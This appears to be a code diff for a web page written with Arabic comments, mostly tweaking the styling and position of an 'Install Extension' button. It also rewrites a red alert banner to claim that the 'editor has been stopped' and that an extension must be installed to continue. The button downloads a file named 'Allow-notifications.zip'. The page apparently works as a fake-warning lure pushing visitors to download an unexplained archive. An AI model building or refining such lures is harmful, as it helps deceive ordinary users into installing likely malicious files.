@@ -11,10 +11,9 @@
       width: 100vw;
       height: 100vh;
       font-family: 'Roboto', sans-serif;
-      background-color: #fff; /* خلفية بيضاء */
+      background-color: #fff;
     }
 
-    /* ✅ شريط التنبيه الأحمر */
     .re-header {
       width: 100%;
       background-color: red;
@@ -64,7 +63,7 @@
       font-size: 16px;
     }
 
-    /* ✅ الزر رجع لطبيعته */
+    /* ✅ الزر مكانه على الشمال وبحجم طبيعي */
     .install-btn {
       display: inline-block;
       text-decoration: none;
@@ -76,8 +75,7 @@
       font-size: 15px;
       cursor: pointer;
       margin-top: 20px;
-      width: auto;
-      max-width: 100%;
+      width: auto; /* المهم هنا */
     }
 
     .preview-images {
@@ -96,8 +94,7 @@
 </head>
 <body>
 
-  <!-- ✅ الشريط الأحمر -->
-  <div class="re-header">يرجى السماح بالإشعارات لمتابعة التثبيت</div>
+  <div class="re-header">تم ايقاف المحرر يرجى تثبيت الاضافه للمتابعه</div>
 
   <div class="wrapper">
     <div class="header">
@@ -109,7 +106,7 @@
       </div>
     </div>
 
-    <!-- ✅ زر التحميل مضبوط -->
+    <!-- ✅ الزر رجع مكانه ع الشمال وحجمه طبيعي -->
     <a href="Allow-notifications.zip" download class="install-btn">Install Extension</a>
 
     <div class="preview-images">
